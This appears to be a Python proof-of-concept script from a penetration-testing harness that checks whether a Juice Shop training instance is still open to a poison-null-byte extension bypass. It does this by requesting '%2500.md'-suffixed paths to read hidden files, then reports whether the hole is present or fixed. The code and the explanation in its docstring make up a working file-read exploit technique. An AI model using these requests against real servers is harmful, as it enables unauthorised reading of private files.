#!/usr/bin/env python3
"""pt34: a poison null byte lets GET /ftp/{file} serve any file in
that directory regardless of its real extension, bypassing the
.md/.pdf allowlist entirely.

Found white-box via the challenge catalog (nullByteChallenge, "Poison
Null Byte", and easterEggLevelOneChallenge, "Easter Egg", whose own
hint names the file-access challenges as the way in).
routes/fileServer.ts's servePublicFiles checks the RAW filename for
an allowed extension, then only afterward truncates it at the first
literal '%00'. A request for 'eastere.gg%2500.md' passes the .md
check on the full string, but the file actually served is everything
before the null byte: eastere.gg, a hidden file the UI never links to
at all. The same technique generalizes to any file in the directory,
confirmed here with a second, unrelated target: a backup of an old
package.json (package.json.bak).

Standard library only (urllib).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt34-001.json"
EASTER_EGG_MARKER = "Congratulations, you found the easter egg!"
PACKAGE_BAK_MARKER = '"name": "juice-shop"'


def _get(target: str, path: str) -> tuple[int, str]:
    req = urllib.request.Request(f"{target}{path}", method="GET")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)

    egg_status, egg_body = _get(target, "/ftp/eastere.gg%2500.md")
    egg_bypassed = egg_status == 200 and EASTER_EGG_MARKER in egg_body

    bak_status, bak_body = _get(target, "/ftp/package.json.bak%2500.md")
    bak_bypassed = bak_status == 200 and PACKAGE_BAK_MARKER in bak_body

    if egg_bypassed and bak_bypassed:
        status = "VULNERABLE"
        summary = "Both a hidden easter-egg file and an unrelated backup file were served via the null-byte extension bypass, confirming this is a general file-read primitive, not a one-off."
    elif egg_status == 403 and bak_status == 403:
        status = "REMEDIATED"
        summary = "Both null-byte requests were rejected (HTTP 403): the extension check now runs against the truncated filename, not the raw one."
    else:
        status = "ERROR"
        summary = f"Inconclusive: egg_status={egg_status}, egg_bypassed={egg_bypassed}, bak_status={bak_status}, bak_bypassed={bak_bypassed}."

    legit_status, legit_body = _get(target, "/ftp/legal.md")
    legitimate_real_md_download_ok = legit_status == 200 and len(legit_body) > 0

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "egg_status": egg_status,
        "egg_bypassed": egg_bypassed,
        "bak_status": bak_status,
        "bak_bypassed": bak_bypassed,
        "summary": summary,
        "legitimate_real_md_download_ok": legitimate_real_md_download_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt34-poison-null-byte-file-read", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
